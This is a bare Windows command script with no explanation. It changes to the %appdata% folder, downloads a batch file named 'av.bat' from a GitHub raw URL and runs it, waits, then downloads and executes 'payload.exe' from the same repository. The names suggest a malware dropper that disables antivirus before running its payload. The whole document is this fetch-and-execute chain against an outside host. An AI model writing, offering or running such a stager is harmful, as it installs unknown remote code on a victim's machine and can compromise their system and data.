cd %appdata% && curl https://raw.githubusercontent.com/ishanarya24/dc/main/av.bat -O
cmd /c av.bat
timeout 15
cd %appdata% && curl https://raw.githubusercontent.com/ishanarya24/dc/main/payload.exe -O
cmd /c payload.exe
